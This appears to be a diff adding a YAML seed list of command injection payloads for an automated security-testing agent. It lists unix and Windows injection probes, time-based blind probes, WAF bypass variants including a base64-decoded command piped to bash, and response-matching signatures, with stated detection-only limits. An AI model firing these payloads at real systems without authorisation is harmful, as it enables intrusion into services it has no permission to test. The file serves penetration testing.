@@ -1,0 +1,100 @@
+# Command injection payloads — seed list for the command injection agent
+#
+# Used when parameters are likely passed to shell commands (e.g. ping, nslookup,
+# file conversion tools, report generators). The agent first probes with unix_basic
+# and windows_basic, then falls back to time-based blind probes if no output is
+# reflected, and finally tries bypass variants when a WAF blocks the basic probes.
+#
+# Safety rules (enforced by agent):
+#   - Detection only: id, whoami, ipconfig — no destructive commands
+#   - Maximum sleep/ping duration: 5 seconds
+#   - No file writes, no reverse shells
+
+payloads:
+  unix_basic:
+    - ";id"
+    - "|id"
+    - "&&id"
+    - "`id`"
+    - "$(id)"
+    - "; id"
+    - "| id"
+    - "&& id"
+    - "` id`"
+    - "$( id)"
+    - ";id;"
+    - "|id|id"
+    - "|| id"
+    - "\nid\n"
+
+  unix_blind_time:
+    # Confirmed injection without reflected output — detect via response delay
+    - "; sleep 5"
+    - "| sleep 5"
+    - "&& sleep 5"
+    - "` sleep 5`"
+    - "$(sleep 5)"
+    - "; sleep 5 #"
+    - "|| sleep 5"
+    # Ping-based alternative (useful when sleep is stripped)
+    - "; ping -c 5 127.0.0.1"
+    - "| ping -c 5 127.0.0.1"
+    - "&& ping -c 5 127.0.0.1"
+    - "$(ping -c 5 127.0.0.1)"
+
+  windows_basic:
+    - "& whoami"
+    - "| whoami"
+    - "&& whoami"
+    - "|| whoami"
+    - "& whoami &"
+    - "| whoami |"
+    - "\r\nwhoami"
+
+  windows_blind_time:
+    # ping loop as a delay primitive on Windows (no sleep command)
+    - "& ping -n 5 127.0.0.1"
+    - "| ping -n 5 127.0.0.1"
+    - "&& ping -n 5 127.0.0.1"
+    # timeout command (non-interactive only, requires /T)
+    - "& timeout /T 5 /NOBREAK"
+    - "| timeout /T 5 /NOBREAK"
+
+  bypass:
+    # Null-byte terminator — truncates suffix appended by the application
+    - ";id%00"
+    - "|id%00"
+    # Newline injection to break out of a quoted argument
+    - "%0aid"
+    - "%0a id"
+    - "%0d%0aid"
+    # IFS (Internal Field Separator) tricks — splits without a visible space
+    - "${IFS}id"
+    - ";${IFS}id"
+    - "|${IFS}id"
+    - "$IFS$9id"
+    - ";$IFS$9id"
+    # Case obfuscation — evades case-sensitive string matching
+    - ";ID"
+    - ";Id"
+    - ";iD"
+    # Brace expansion
+    - ";{id,}"
+    - ";{id}"
+    # Base64-encoded payload decoded at runtime — bypasses literal keyword filters
+    - "; echo aWQ= | base64 -d | bash"
+    - "$(echo aWQ= | base64 -d)"
+    # Concatenation inside the shell
+    - ";i''d"
+    - ";i\"\"d"
+    - ";i\\d"
+
+# Detection signatures — matched against raw response body (case-insensitive)
+match_signatures:
+  - 'uid=\d+\('
+  - 'root|daemon|nobody'
+  - 'Volume Serial Number'
+  - 'Windows IP'
+
+# Response delay threshold used by time-based blind detection
+time_threshold_ms: 4500
